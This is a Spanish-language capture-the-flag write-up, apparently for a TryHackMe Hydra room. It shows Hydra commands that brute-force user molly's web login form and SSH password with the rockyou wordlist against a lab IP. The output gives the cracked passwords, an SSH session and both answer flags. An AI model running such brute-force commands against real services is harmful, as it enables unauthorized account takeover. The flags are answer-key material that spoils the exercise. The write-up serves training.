## Objetivo
## Pistas
## Solución

```
Entramos a la pagina
vemos que es un login

Use Hydra to bruteforce molly's web password. What is flag 1?

dice que el usuario es molly entonces solo buscamos el password
y nos fijamos en el mensaje de error cuando no ponemos bien algo para iniciar sesion

┌──(kali㉿kali)-[~]
└─$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.206.242 http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect." -t 64 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-18 21:27:24
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-post-form://10.10.206.242:80/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect.
[80][http-post-form] host: 10.10.206.242   login: molly   password: sunshine
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-18 21:27:32
                                                                                                    
┌──(kali㉿kali)-[~]
└─$ 

THM{2673a7dd116de68e85c48ec0b1f2612e}

Use Hydra to bruteforce molly's SSH password. What is flag 2?

Ahora en ssh

┌──(kali㉿kali)-[~]
└─$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.206.242 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-18 21:30:41
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.206.242:22/
[22][ssh] host: 10.10.206.242   login: molly   password: butterfly
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-18 21:30:58

Usamos el password descubierto

┌──(kali㉿kali)-[~]
└─$ ssh molly@10.10.206.242  

molly@ip-10-10-206-242:~$ ls
flag2.txt
molly@ip-10-10-206-242:~$ cat flag2.txt
THM{c8eeb0468febbadea859baeb33b2541b}
molly@ip-10-10-206-242:~$ 


```
## Notas adicionales
## Referencias